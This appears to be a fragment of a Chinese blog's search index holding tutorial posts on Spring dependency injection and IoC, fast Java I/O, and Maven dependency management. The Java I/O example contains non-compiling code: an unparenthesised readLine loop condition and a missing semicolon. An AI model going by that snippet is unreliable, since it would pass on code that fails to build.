class=\"com.test.bean.ArtTeacher\"/\u003e \u003cbean name=\"student\" class=\"com.test.bean.Student\"\u003e \u003cconstructor-arg name=\"teacher\" ref=\"teacher\"/\u003e \u003c/bean\u003e 这里的constructor-arg就是构造方法的一个参数，这个参数可以写很多个，会自动匹配符合里面参数数量的构造方法，这里匹配的就是我们刚刚编写的需要一个参数的构造方法。 通过这种方式，我们也能实现依赖注入，只不过现在我们将依赖注入的时机提前到了对象构造时。 那要是出现这种情况呢？现在我们的Student类中是这样定义的： public class Student { private final String name; public Student(String name){ System.out.println(\"我是一号构造方法\"); this.name = name; } public Student(int age){ System.out.println(\"我是二号构造方法\"); this.name = String.valueOf(age); } } 此时我们希望使用的是二号构造方法，那么怎么才能指定呢？有2种方式，我们可以给标签添加类型： \u003cconstructor-arg value=\"1\" type=\"int\"/\u003e 也可以指定为对应的参数名称： \u003cconstructor-arg value=\"1\" name=\"age\"/\u003e 反正只要能够保证我们指定的参数匹配到目标构造方法即可。 现在我们的类中出现了一个比较特殊的类型，它是一个集合类型： public class Student { private List\u003cString\u003e list; public void setList(List\u003cString\u003e list) { this.list = list; } } 对于这种集合类型，有着特殊的支持： \u003cbean name=\"student\" class=\"com.test.bean.Student\"\u003e \u003c!-- 对于集合类型，我们可以直接使用标签编辑集合的默认值 --\u003e \u003cproperty name=\"list\"\u003e \u003clist\u003e \u003cvalue\u003eAAA\u003c/value\u003e \u003cvalue\u003eBBB\u003c/value\u003e \u003cvalue\u003eCCC\u003c/value\u003e \u003c/list\u003e \u003c/property\u003e \u003c/bean\u003e 不仅仅是List，Map、Set这类常用集合类包括数组在内，都是支持这样编写的，比如Map类型，我们也可以使用entry来注入： \u003cbean name=\"student\" class=\"com.test.bean.Student\"\u003e \u003cproperty name=\"map\"\u003e \u003cmap\u003e \u003centry key=\"语文\" value=\"100.0\"/\u003e \u003centry key=\"数学\" value=\"80.0\"/\u003e \u003centry key=\"英语\" value=\"92.5\"/\u003e \u003c/map\u003e \u003c/property\u003e \u003c/bean\u003e 至此，我们就已经完成了两种依赖注入的学习： Setter依赖注入：通过成员属性对应的set方法完成注入。 构造方法依赖注入：通过构造方法完成注入。 ","date":"2024-04-15","objectID":"/articles/2024/04/spring-injection/:0:1","tags":["Java","JavaEE","SSM"],"title":"Spring基础:依赖注入","uri":"/articles/2024/04/spring-injection/"},{"categories":["Java"],"content":"创建第一个Spring项目 使用Spring框架的目的在于解耦合，而非简化代码。 Spring框架由很多模块组成： 其中最核心的框架就是：Core Container。 只有了解了Spring的核心技术，我们才能真正认识这个框架为我们带来的便捷之处。 Spring是一个非入侵式的框架，就像一个工具库一样，它可以很简单地加入到我们已有的项目中，因此，我们只需要直接导入其依赖就可以使用了，Spring核心框架的Maven依赖坐标： \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-context\u003c/artifactId\u003e \u003cversion\u003e6.0.10\u003c/version\u003e \u003c/dependency\u003e Spring 6要求Java的版本在17及以上，另外在SpringMVC中，要求Tomcat的版本在10及以上。 这里出现的都是Spring核心相关的内容，如Beans、Core、Context、SpEL以及非常关键的AOP框架。 首先在Maven项目的resources文件夹下创建Spring项目的配置文件，内容如下： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003c/beans\u003e Spring为我们提供了一个IoC容器，用于去存放我们需要使用的对象，我们可以将对象交给IoC容器进行管理，当我们需要使用对象时，就可以向IoC容器去索要，并由它来决定给我们哪一个对象。而我们如果需要使用Spring为我们提供的IoC容器，那么就需要创建一个应用程序上下文，它代表的就是IoC容器，它会负责实例化、配置和组装Bean： public static void main(String[] args) { //ApplicationContext是应用程序上下文的顶层接口，它有很多种实现，这里我们先介绍第一种 //因为这里使用的是XML配置文件，所以说我们就使用 ClassPathXmlApplicationContext 这个实现类 ApplicationContext context = new ClassPathXmlApplicationContext(\"application.xml\"); //这里写上刚刚的名字 } 此时，我们用之前使用过的例子实现一个Service接口： package org.alextang.service; public interface Service { } 然后，为该接口实现两个类： package org.alextang.service; public class ServiceA implements Service{ } package org.alextang.service; public class ServiceB implements Service{ } 接下来，我们就可以在Spring的配置文件中配置Bean了： \u003cbean name=\"ServiceA\" class=\"org.alextang.service.ServiceA\"/\u003e Bean的name属性不是必须的。但是配置完成之后，就可以使用Bean的name来在IoC容器中getBean了。如果不配置，同样可以使用类的名称来getBean。 接下来，我们在不实例化的情况下，让IoC容器为我们实例化一个Service的实现： package org.alextang; import org.alextang.service.Service; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class Main { public static void main(String[] args) { ApplicationContext context = new ClassPathXmlApplicationContext(\"application.xml\"); Service service = context.getBean(Service.class); System.out.println(service); } } 运行，即可发现我们确实拿到了Bean中配置的类的实例： org.alextang.service.ServiceA@123f1134 进程已结束，退出代码为 0 此时，只需要通过更改配置文件中的内容，即可在不改变主函数代码的情况下更换拿到的实例。 ... \u003cbean name=\"ServiceB\" class=\"org.alextang.service.ServiceB\"/\u003e \u003c/beans\u003e 再次运行主函数： org.alextang.service.ServiceB@123f1134 进程已结束，退出代码为 0 同时，我们也可以使用定义的name拿到实例，但是注意需要强制转换。 package org.alextang; import org.alextang.service.Service; import org.springframework.context.ApplicationContext; import org.springframework.context.support.ClassPathXmlApplicationContext; public class Main { public static void main(String[] args) { ApplicationContext context = new ClassPathXmlApplicationContext(\"application.xml\"); Service service = context.getBean(Service.class); Service service1 = (Service) context.getBean(\"ServiceB\"); System.out.println(service); System.out.println(service1); } } org.alextang.service.ServiceB@123f1134 org.alextang.service.ServiceB@123f1134 进程已结束，退出代码为 0 实际上，这里得到的Student对象是由Spring通过反射机制帮助我们创建的。在高耦合度的软件开发中，我们才能体会到IoC容器管理的便捷之处。 ","date":"2024-04-15","objectID":"/articles/2024/04/spring-test/:0:1","tags":["Java","JavaEE","SSM"],"title":"Spring基础:创建项目和Bean","uri":"/articles/2024/04/spring-test/"},{"categories":["Java"],"content":"Bean的创建和配置 注意，IoC容器使用的默认模式是单例模式，无论对类进行多少次getBean，拿到的都是一个实例。当然可以在Spring配置中修改设计模式。 ... \u003cbean name=\"ServiceB\" class=\"org.alextang.service.ServiceB\" scope=\"prototype\"/\u003e ... prototype为原型模式，singleto为单例模式。同时，在单例模式下，默认的配置中在容器加载配置的时候就会创建Bean的对象。无论只有需不需要这个对象，该对象都会一直存在，直到容器结束后销毁。而原型模式则是在使用的时候才会创建该对象。 当然，如果我们不想让单例模式中直接加载Bean，可以打开单例模式的懒加载模式 ... \u003cbean name=\"ServiceB\" class=\"org.alextang.service.ServiceB\" lazy-init=\"true\"/\u003e ... ","date":"2024-04-15","objectID":"/articles/2024/04/spring-test/:0:2","tags":["Java","JavaEE","SSM"],"title":"Spring基础:创建项目和Bean","uri":"/articles/2024/04/spring-test/"},{"categories":["Java"],"content":"IoC容器基础 Spring框架最核心的其实它的IoC容器，Spring框架使用IoC容器管理各个不同的组件。 ","date":"2024-04-14","objectID":"/articles/2024/04/spring-ioc/:1:0","tags":["Java","JavaEE","SSM"],"title":"Spring基础:IoC理论","uri":"/articles/2024/04/spring-ioc/"},{"categories":["Java"],"content":"IoC理论介绍 在Java的应用程序开发中，程序中的各个组件都是相互耦合的。每一个组件都可能依赖着另外的一个组件。比如说：要展示借阅信息列表，那么首先需要使用Servlet进行请求和响应的数据处理，然后请求的数据全部交给对应的Service（业务层）来处理，当Service发现要从数据库中获取数据时，再向对应的Mapper发起请求。简单来说，应用程序中的各个类就像连接在一起的齿轮，谁也离不开谁。 虽然这样开发的逻辑非常清晰，但是存在一个很严重的问题。如果其中的一个模块需要更新，那么就需要去其他所有的模块中重新修改有关改部分模块的内容。这样可能会导致整个项目的重新编写。这就是项目中各个组件耦合度过高的原因。比如说下面的情况： class A{ private List\u003cB\u003e list; public B test(B b){ return null; } } class C{ public C(B b){} } class B{ } 可以看到，A和C在大量地直接使用B，但是某一天，这个B的实现已经过时了，此时来了个把功能实现的更好的D，我们需要用这个新的类来完成业务了： 可以看到，因为类之间的关联性太强了，会开始大面积报错，所有之前用了B的类，得挨个进行修改，全都改成D。 为了解除现代软件中耦合度过高的问题，我们只能想办法将各个模块进行解耦合。让各个模块之间的依赖性不再那么地强。换句话说，软件中某个模块的实现类不再由我们来决定，而是让软件自己来决定。这样就引入了IoC理论。 IOC是Inversion of Control的缩写，翻译为：“控制反转”，把复杂系统分解成相互合作的对象，这些对象类通过封装以后，内部实现对外部是透明的，从而降低了解决问题的复杂度，而且可以灵活地被重用和扩展。如下图所示： 我们可以将对象交给IoC容器进行管理，比如当我们需要一个接口的实现时，由它根据配置文件来决定到底给我们哪一个实现类，这样，我们就可以不用再关心我们要去使用哪一个实现类了，我们只需要关心，给到我的一定是一个可以正常使用的实现类，能用就完事了，反正接口定义了啥，我只管调，这样，我们就可以放心地让一个人去写视图层的代码，一个人去写业务层的代码。即使出现了迭代更新也可以很方便的修改。 IoC理论实际上就是将项目中不变的东西抽象出来，使用不变的东西管理经常变化的东西，因此只管变就行。 如果将之前的代码改为IoC容器的版本，将是这样的（示例）： public static void main(String[] args) { A a = new A(); a.test(IoC.getBean(Service.class)); //瞎编的一个容器类，但是是那个意思 //比如现在在IoC容器中管理的Service的实现是B，那么我们从里面拿到的Service实现就是B } class A{ private List\u003cService\u003e list; //一律使用Service，具体实现由IoC容器提供 public Service test(Service b){ return null; } } interface Service{ } //使用Service做一个顶层抽象 class B implements Service{} //B依然是具体实现类，并交给IoC容器管理 interface Service{ } class D implements Service{} //现在实现类变成了D，但是之前的代码并不会报错 从上面的代码可以看出，无论是何种实现类实现了Service接口，IoC容器都可以直接调用出想要的实现类，而不需要在原来的代码中进行修改，只需要一直更新即可。 高内聚，低耦合，是现代软件的开发的设计目标，而Spring框架就给我们提供了这样的一个IoC容器进行对象的的管理，一个由Spring IoC容器实例化、组装和管理的对象，我们称其为Bean。 ","date":"2024-04-14","objectID":"/articles/2024/04/spring-ioc/:1:1","tags":["Java","JavaEE","SSM"],"title":"Spring基础:IoC理论","uri":"/articles/2024/04/spring-ioc/"},{"categories":["Java"],"content":"Java IO优化 使用Scanner进行输入输出会非常方便，但是当读入或者输出的数据量超过$10^5$ 的数量级时，很容易TLE（Java在算法题中的时限一般为2s）。于是我们可以使用BufferedReader和PrintWriter（或者BufferedWriter）进行输入输出。 头文件（如果非要一个个全写出来的话）： java.io.BuffereReader java.io.BufferedWriter java.io.InputStreamReader java.io.OutputStreamWriter java.io.PrintWriter java.io.IOException 我的建议是java.io.*会好一点。 另外，不要忘记抛出异常！ 输入输出样例： import java.io.*; public class Main { public static void main(String[] args) throws IOException{ BufferedReader in = new BufferedReader(new InputStreamReader(System.in)); PrintWriter out = new PrintWriter(new OutputStreamWriter(System.out)); BufferedWriter wout = new BufferedWriter(new OutputStreamWriter(System.out)); //BufferedReader只能返回一行的String String t = in.readLine(); //接下来根据需要对t进行处理即可 int n = Integer.parseInt(t); double l = Double.parseDouble(t); long s = Long.parseLong(t); //特别的，如果出现一行多个使用空格分割的情况，使用String类的split()方法进行分割 String[] strArr = in.readLine().split(\" \"); //对于多组数据的读入，readLine()读到EOF会返回null while(t = in.readLine() != null) { //... } //PrintWriter的输出方法和System.out一致 out.print(t); out.printf(\"%.2f\\n\", l); //BufferedWriter则使用write函数 wout.write(\"Hello\"); //这两种方法一定记得使用flush()刷新缓冲区到屏幕，整个程序只需要刷新一次即可 out.flush() } } ","date":"2024-04-12","objectID":"/articles/2024/04/java-io/:1:0","tags":["Java","JavaIO","JavaSE"],"title":"Java IO优化","uri":"/articles/2024/04/java-io/"},{"categories":["Java"],"content":"使用Maven管理项目 注意： 开始之前，看看你C盘空间够不够，最好预留2GB空间以上！ 吐槽： 很多电脑预装系统C盘都给得巨少，就算不装软件，一些软件的缓存文件也能给你塞满，建议有时间重装一下系统重新分配一下磁盘空间。 Maven 翻译为\"专家\"、“内行”，是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。Maven 是一个项目管理工具，可以对 Java 项目进行构建、依赖管理。Maven 也可被用于构建和管理各种项目，例如 C#，Ruby，Scala 和其他语言编写的项目。Maven 曾是 Jakarta 项目的子项目，现为由 Apache 软件基金会主持的独立 Apache 项目。 通过Maven，可以帮助我们做： 项目的自动构建，包括代码的编译、测试、打包、安装、部署等操作。 依赖管理，项目使用到哪些依赖，可以快速完成导入。 我们之前并没有讲解如何将我们的项目打包为Jar文件运行，同时，我们导入依赖的时候，每次都要去下载对应的Jar包，这样其实是很麻烦的，并且还有可能一个Jar包依赖于另一个Jar包，就像之前使用JUnit一样，因此我们需要一个更加方便的包管理机制。 Maven也需要安装环境，但是IDEA已经自带了Maven环境，因此我们不需要再去进行额外的环境安装（无IDEA也能使用Maven，但是配置过程很麻烦，并且我们现在使用的都是IDEA的集成开发环境，所以这里就不讲解Maven命令行操作了）我们直接创建一个新的Maven项目即可。 ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:0","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"Maven项目结构 我们可以来看一下，一个Maven项目和我们普通的项目有什么区别： 那么首先，我们需要了解一下POM文件，它相当于是我们整个Maven项目的配置文件，它也是使用XML编写的： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003eMavenTest\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cproperties\u003e \u003cmaven.compiler.source\u003e8\u003c/maven.compiler.source\u003e \u003cmaven.compiler.target\u003e8\u003c/maven.compiler.target\u003e \u003c/properties\u003e \u003c/project\u003e 我们可以看到，Maven的配置文件是以project为根节点，而modelVersion定义了当前模型的版本，一般是4.0.0，我们不用去修改。 groupId、artifactId、version这三个元素合在一起，用于唯一区别每个项目，别人如果需要将我们编写的代码作为依赖，那么就必须通过这三个元素来定位我们的项目，我们称为一个项目的基本坐标，所有的项目一般都有自己的Maven坐标，因此我们通过Maven导入其他的依赖只需要填写这三个基本元素就可以了，无需再下载Jar文件，而是Maven自动帮助我们下载依赖并导入。 groupId 一般用于指定组名称，命名规则一般和包名一致，比如我们这里使用的是org.example，一个组下面可以有很多个项目。 artifactId 一般用于指定项目在当前组中的唯一名称，也就是说在组中用于区分于其他项目的标记。 version 代表项目版本，随着我们项目的开发和改进，版本号也会不断更新，就像LOL一样，每次赛季更新都会有一个大版本更新，我们的Maven项目也是这样，我们可以手动指定当前项目的版本号，其他人使用我们的项目作为依赖时，也可以根本版本号进行选择（这里的SNAPSHOT代表快照，一般表示这是一个处于开发中的项目，正式发布项目一般只带版本号） properties中一般都是一些变量和选项的配置，我们这里指定了JDK的源代码和编译版本为1.8，无需进行修改。 ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:1","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"Maven依赖导入 现在我们尝试使用Maven来帮助我们快速导入依赖，我们需要导入之前的JDBC驱动依赖、JUnit依赖、Mybatis依赖、Lombok依赖，那么如何使用Maven来管理依赖呢？ 我们可以创建一个dependencies节点： \u003cdependencies\u003e //里面填写的就是所有的依赖 \u003c/dependencies\u003e 那么现在就可以向节点中填写依赖了，那么我们如何知道每个依赖的坐标呢？我们可以在：https://mvnrepository.com/ 进行查询（可能打不开，建议用流量，或是直接百度某个项目的Maven依赖），我们直接搜索lombok即可，打开后可以看到已经给我们写出了依赖的坐标： \u003cdependency\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok\u003c/artifactId\u003e \u003cversion\u003e1.18.22\u003c/version\u003e \u003cscope\u003eprovided\u003c/scope\u003e \u003c/dependency\u003e 我们直接将其添加到dependencies节点中即可，现在我们来编写一个测试用例看看依赖导入成功了没有： public class Main { public static void main(String[] args) { Student student = new Student(\"小明\", 18); System.out.println(student); } } @Data @AllArgsConstructor public class Student { String name; int age; } 项目运行成功，表示成功导入了依赖。那么，Maven是如何进行依赖管理呢，以致于如此便捷的导入依赖，我们来看看Maven项目的依赖管理流程： 通过流程图我们得知，一个项目依赖一般是存储在中央仓库中，也有可能存储在一些其他的远程仓库（私服），几乎所有的依赖都被放到了中央仓库中，因此，Maven可以直接从中央仓库中下载大部分的依赖（Maven第一次导入依赖是需要联网的），远程仓库中下载之后 ，会暂时存储在本地仓库，我们会发现我们本地存在一个.m2文件夹，这就是Maven本地仓库文件夹，默认建立在C盘，如果你C盘空间不足，会出现问题！ 在下次导入依赖时，如果Maven发现本地仓库中就已经存在某个依赖，那么就不会再去远程仓库下载了。 可能在导入依赖时，小小伙伴们会出现卡顿的问题，我们建议配置一下IDEA自带的Maven插件远程仓库地址，我们打开IDEA的安装目录，找到安装根目录/plugins/maven/lib/maven3/conf文件夹，找到settings.xml文件，打开编辑： 找到mirros标签，添加以下内容： \u003cmirror\u003e \u003cid\u003enexus-aliyun\u003c/id\u003e \u003cmirrorOf\u003e*\u003c/mirrorOf\u003e \u003cname\u003eNexus aliyun\u003c/name\u003e \u003curl\u003ehttp://maven.aliyun.com/nexus/content/groups/public\u003c/url\u003e \u003c/mirror\u003e 这样，我们就将默认的远程仓库地址（国外），配置为国内的阿里云仓库地址了（依赖的下载速度就会快起来了） ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:2","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"Maven依赖作用域 除了三个基本的属性用于定位坐标外，依赖还可以添加以下属性： type：依赖的类型，对于项目坐标定义的packaging。大部分情况下，该元素不必声明，其默认值为jar scope：依赖的范围（作用域，着重讲解） optional：标记依赖是否可选 exclusions：用来排除传递性依赖（一个项目有可能依赖于其他项目，就像我们的项目，如果别人要用我们的项目作为依赖，那么就需要一起下载我们项目的依赖，如Lombok） 我们着重来讲解一下scope属性，它决定了依赖的作用域范围： compile ：为默认的依赖有效范围。如果在定义依赖关系的时候，没有明确指定依赖有效范围的话，则默认采用该依赖有效范围。此种依赖，在编译、运行、测试时均有效。 provided ：在编译、测试时有效，但是在运行时无效，也就是说，项目在运行时，不需要此依赖，比如我们上面的Lombok，我们只需要在编译阶段使用它，编译完成后，实际上已经转换为对应的代码了，因此Lombok不需要在项目运行时也存在。 runtime ：在运行、测试时有效，但是在编译代码时无效。比如我们如果需要自己写一个JDBC实现，那么肯定要用到JDK为我们指定的接口，但是实际上在运行时是不用自带JDK的依赖，因此只保留我们自己写的内容即可。 test ：只在测试时有效，例如：JUnit，我们一般只会在测试阶段使用JUnit，而实际项目运行时，我们就用不到测试了，那么我们来看看，导入JUnit的依赖： 同样的，我们可以在网站上搜索Junit的依赖，我们这里导入最新的JUnit5作为依赖： \u003cdependency\u003e \u003cgroupId\u003eorg.junit.jupiter\u003c/groupId\u003e \u003cartifactId\u003ejunit-jupiter\u003c/artifactId\u003e \u003cversion\u003e5.8.1\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e 我们所有的测试用例全部编写到Maven项目给我们划分的test目录下，位于此目录下的内容不会在最后被打包到项目中，只用作开发阶段测试使用： public class MainTest { @Test public void test(){ System.out.println(\"测试\"); //Assert在JUnit5时名称发生了变化Assertions Assertions.assertArrayEquals(new int[]{1, 2, 3}, new int[]{1, 2}); } } 因此，一般仅用作测试的依赖如JUnit只保留在测试中即可，那么现在我们再来添加JDBC和Mybatis的依赖： \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cversion\u003e8.0.27\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.mybatis\u003c/groupId\u003e \u003cartifactId\u003emybatis\u003c/artifactId\u003e \u003cversion\u003e3.5.7\u003c/version\u003e \u003c/dependency\u003e 我们发现，Maven还给我们提供了一个resource文件夹，我们可以将一些静态资源，比如配置文件，放入到这个文件夹中，项目在打包时会将资源文件夹中文件一起打包的Jar中，比如我们在这里编写一个Mybatis的配置文件： \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!DOCTYPE configuration PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-config.dtd\"\u003e \u003cconfiguration\u003e \u003csettings\u003e \u003csetting name=\"mapUnderscoreToCamelCase\" value=\"true\"/\u003e \u003csetting name=\"cacheEnabled\" value=\"true\"/\u003e \u003csetting name=\"logImpl\" value=\"JDK_LOGGING\" /\u003e \u003c/settings\u003e \u003c!-- 需要在environments的上方 --\u003e \u003ctypeAliases\u003e \u003cpackage name=\"com.test.entity\"/\u003e \u003c/typeAliases\u003e \u003cenvironments default=\"development\"\u003e \u003cenvironment id=\"development\"\u003e \u003ctransactionManager type=\"JDBC\"/\u003e \u003cdataSource type=\"POOLED\"\u003e \u003cproperty name=\"driver\" value=\"com.mysql.cj.jdbc.Driver\"/\u003e \u003cproperty name=\"url\" value=\"jdbc:mysql://localhost:3306/study\"/\u003e \u003cproperty name=\"username\" value=\"test\"/\u003e \u003cproperty name=\"password\" value=\"123456\"/\u003e \u003c/dataSource\u003e \u003c/environment\u003e \u003c/environments\u003e \u003cmappers\u003e \u003cmapper class=\"com.test.mapper.TestMapper\"/\u003e \u003c/mappers\u003e \u003c/configuration\u003e 现在我们创建一下测试用例，顺便带大家了解一下Junit5的一些比较方便的地方： public class MainTest { //因为配置文件位于内部，我们需要使用Resources类的getResourceAsStream来获取内部的资源文件 private static SqlSessionFactory factory; //在JUnit5中@Before被废弃，它被细分了： @BeforeAll // 一次性开启所有测试案例只会执行一次 (方法必须是static) // @BeforeEach 一次性开启所有测试案例每个案例开始之前都会执行一次 @SneakyThrows public static void before(){ factory = new SqlSessionFactoryBuilder() .build(Resources.getResourceAsStream(\"mybatis.xml\")); } @DisplayName(\"Mybatis数据库测试\") //自定义测试名称 @RepeatedTest(3) //自动执行多次测试 public void test(){ try (SqlSession sqlSession = factory.openSession(true)){ TestMapper testMapper = sqlSession.getMapper(TestMapper.class); System.out.println(testMapper.getStudentBySid(1)); } } } 那么就有人提问了，如果我需要的依赖没有上传的远程仓库，而是只有一个Jar怎么办呢？我们可以使用第四种作用域： system：作用域和provided是一样的，但是它不是从远程仓库获取，而是直接导入本地Jar包： \u003cdependency\u003e \u003cgroupId\u003ejavax.jntm\u003c/groupId\u003e \u003cartifactId\u003elbwnb\u003c/artifactId\u003e \u003cversion\u003e2.0\u003c/version\u003e \u003cscope\u003esystem\u003c/scope\u003e \u003csystemPath\u003eC://学习资料/4K高清无码/test.jar\u003c/systemPath\u003e \u003c/dependency\u003e 比如上面的例子，如果scope为system，那么我们需要添加一个systemPath来指定jar文件的位置，这里就不再演示了。 ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:3","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"Maven可选依赖 当项目中的某些依赖不希望被使用此项目作为依赖的项目使用时，我们可以给依赖添加optional标签表示此依赖是可选的，默认在导入依赖时，不会导入可选的依赖： \u003coptional\u003etrue\u003c/optional\u003e 比如Mybatis的POM文件中，就存在大量的可选依赖： \u003cdependency\u003e \u003cgroupId\u003eorg.slf4j\u003c/groupId\u003e \u003cartifactId\u003eslf4j-api\u003c/artifactId\u003e \u003cversion\u003e1.7.30\u003c/version\u003e \u003coptional\u003etrue\u003c/optional\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.slf4j\u003c/groupId\u003e \u003cartifactId\u003eslf4j-log4j12\u003c/artifactId\u003e \u003cversion\u003e1.7.30\u003c/version\u003e \u003coptional\u003etrue\u003c/optional\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003elog4j\u003c/groupId\u003e \u003cartifactId\u003elog4j\u003c/artifactId\u003e \u003cversion\u003e1.2.17\u003c/version\u003e \u003coptional\u003etrue\u003c/optional\u003e \u003c/dependency\u003e ... 由于Mybatis要支持多种类型的日志，需要用到很多种不同的日志框架，因此需要导入这些依赖来做兼容，但是我们项目中并不一定会使用这些日志框架作为Mybatis的日志打印器，因此这些日志框架仅Mybatis内部做兼容需要导入使用，而我们可以选择不使用这些框架或是选择其中一个即可，也就是说我们导入Mybatis之后想用什么日志框架再自己加就可以了。 ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:4","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"Maven排除依赖 我们了解了可选依赖，现在我们可以让使用此项目作为依赖的项目默认不使用可选依赖，但是如果存在那种不是可选依赖，但是我们导入此项目有不希望使用此依赖该怎么办呢，这个时候我们就可以通过排除依赖来防止添加不必要的依赖： \u003cdependency\u003e \u003cgroupId\u003eorg.junit.jupiter\u003c/groupId\u003e \u003cartifactId\u003ejunit-jupiter\u003c/artifactId\u003e \u003cversion\u003e5.8.1\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003cexclusions\u003e \u003cexclusion\u003e \u003cgroupId\u003eorg.junit.jupiter\u003c/groupId\u003e \u003cartifactId\u003ejunit-jupiter-engine\u003c/artifactId\u003e \u003c/exclusion\u003e \u003c/exclusions\u003e \u003c/dependency\u003e 我们这里演示了排除JUnit的一些依赖，我们可以在外部库中观察排除依赖之后和之前的效果。 ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:5","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"Maven继承关系 一个Maven项目可以继承自另一个Maven项目，比如多个子项目都需要父项目的依赖，我们就可以使用继承关系来快速配置。 我们右键左侧栏，新建一个模块，来创建一个子项目： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cparent\u003e \u003cartifactId\u003eMavenTest\u003c/artifactId\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003c/parent\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cartifactId\u003eChildModel\u003c/artifactId\u003e \u003cproperties\u003e \u003cmaven.compiler.source\u003e8\u003c/maven.compiler.source\u003e \u003cmaven.compiler.target\u003e8\u003c/maven.compiler.target\u003e \u003c/properties\u003e \u003c/project\u003e 我们可以看到，IDEA默认给我们添加了一个parent节点，表示此Maven项目是父Maven项目的子项目，子项目直接继承父项目的groupId，子项目会直接继承父项目的所有依赖，除非依赖添加了optional标签，我们来编写一个测试用例尝试一下: import lombok.extern.java.Log; @Log public class Main { public static void main(String[] args) { log.info(\"我是日志信息\"); } } 可以看到，子项目也成功继承了Lombok依赖。 我们还可以让父Maven项目统一管理所有的依赖，包括版本号等，子项目可以选取需要的作为依赖，而版本全由父项目管理，我们可以将dependencies全部放入dependencyManagement节点，这样父项目就完全作为依赖统一管理。 \u003cdependencyManagement\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok\u003c/artifactId\u003e \u003cversion\u003e1.18.22\u003c/version\u003e \u003cscope\u003eprovided\u003c/scope\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.junit.jupiter\u003c/groupId\u003e \u003cartifactId\u003ejunit-jupiter\u003c/artifactId\u003e \u003cversion\u003e5.8.1\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cversion\u003e8.0.27\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.mybatis\u003c/groupId\u003e \u003cartifactId\u003emybatis\u003c/artifactId\u003e \u003cversion\u003e3.5.7\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/dependencyManagement\u003e 我们发现，子项目的依赖失效了，因为现在父项目没有依赖，而是将所有的依赖进行集中管理，子项目需要什么再拿什么即可，同时子项目无需指定版本，所有的版本全部由父项目决定，子项目只需要使用即可： \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok\u003c/artifactId\u003e \u003cscope\u003eprovided\u003c/scope\u003e \u003c/dependency\u003e \u003c/dependencies\u003e 当然，父项目如果还存在dependencies节点的话，里面的内依赖依然是直接继承： \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.junit.jupiter\u003c/groupId\u003e \u003cartifactId\u003ejunit-jupiter\u003c/artifactId\u003e 